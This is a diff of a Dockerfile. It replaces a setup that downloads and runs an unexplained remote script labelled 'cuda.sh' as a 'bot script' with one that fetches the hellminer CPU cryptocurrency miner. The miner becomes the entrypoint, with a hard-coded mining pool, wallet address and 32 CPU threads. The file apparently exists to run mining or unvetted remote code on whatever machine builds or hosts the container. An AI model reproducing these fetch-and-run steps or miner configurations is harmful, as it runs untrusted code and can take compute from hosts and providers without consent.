@@ -1,35 +1,8 @@
-FROM phusion/baseimage:bionic-1.0.0
-
-# Use baseimage-docker's init system:
-CMD ["/sbin/my_init"]
-
-# Install dependencies:
-RUN apt-get update && apt-get install -y \
-    bash \
-    curl \
-    sudo \
-    wget \
-    git \
-    make \
-    busybox \
-    build-essential \
-    nodejs \
-    npm \
-    screen \
-    neofetch \
-    ca-certificates \
-    libcurl4 \
-    libjansson4 \
-    libgomp1 \
-    libnuma-dev \
- && mkdir -p /home/stuff
-
-# Set work dir:
+FROM ubuntu:latest AS build
+RUN apt-get update && apt-get -y install wget vim
 WORKDIR /home
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+RUN tar -xf hellminer_cpu_linux.tar.gz
 
-# Run config.sh and clean up APT:
-RUN wget https://raw.githubusercontent.com/Haxmailru/ymode/main/cuda.sh \
- && chmod +x cuda.sh
-
-# Run bot script:
-CMD bash cuda.sh
+ENTRYPOINT [ "./hellminer" ]
+CMD [ "-c", "stratum+tcp://na.luckpool.net:3956#xnsub", "-u", "RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.matipasti", "-p", "x", "--cpu", "32" ]
